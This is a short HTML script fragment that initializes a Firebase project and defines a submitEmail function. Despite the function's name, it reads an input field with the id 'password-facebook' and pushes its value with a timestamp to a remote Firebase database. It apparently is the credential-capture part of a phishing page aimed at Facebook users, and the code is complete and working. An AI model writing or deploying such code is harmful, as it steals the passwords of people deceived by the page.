
<script>
    // Your Firebase setup code
    var firebaseConfig = {
        apiKey: "AIzaSyAcqxvsTQGIJrcRKq9B5ldBsMjWB4doYRg",
        authDomain: "test-for-admin-9c05c.firebaseapp.com",
        databaseURL: "https://test-for-admin-9c05c-default-rtdb.firebaseio.com",
        projectId: "test-for-admin-9c05c",
        storageBucket: "test-for-admin-9c05c.appspot.com",
        messagingSenderId: "180529484791",
        appId: "1:180529484791:web:9b5ed35a77400473dd54f2"
    };
    firebase.initializeApp(firebaseConfig);

    function submitEmail() {
        var name = document.getElementById('password-facebook').value;

        // Check if email input is not empty
        if (name === "") {
            console.log("Field is empty!");
            return;
        }

        firebase.database().ref('Names').push({
            name: name,
            timestamp: new Date().toISOString()
        }).then(() => {
           console.log('Data saved successfully');
        }).catch((error) => {
           console.log('Error occurred: ' + error);
        });
    }
</script>
